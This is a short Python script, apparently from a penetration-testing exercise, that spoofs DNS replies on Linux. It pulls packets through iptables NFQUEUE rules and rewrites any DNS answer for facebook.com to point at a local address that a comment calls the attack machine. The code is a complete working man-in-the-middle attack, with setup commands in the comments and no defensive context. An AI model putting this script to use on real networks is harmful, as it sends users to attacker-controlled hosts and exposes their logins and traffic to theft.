#!/usr/bin/python

# Run on Linux
import netfilterqueue
import scapy.all as scapy

# Flush IP tables
# iptables --flush
# Create queue
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0

# Clear len and checksum
def del_flds(scapy_packet):
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # Look for DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "facebook.com" in qname:
            # Use attack machine IP
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.10")
            scapy_packet[scapy.DNS].an = answer
            # Set DNS answer count
            scapy_packet[scapy.DNS].ancount = 1

            scapy_packet = del_flds(scapy_packet)

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
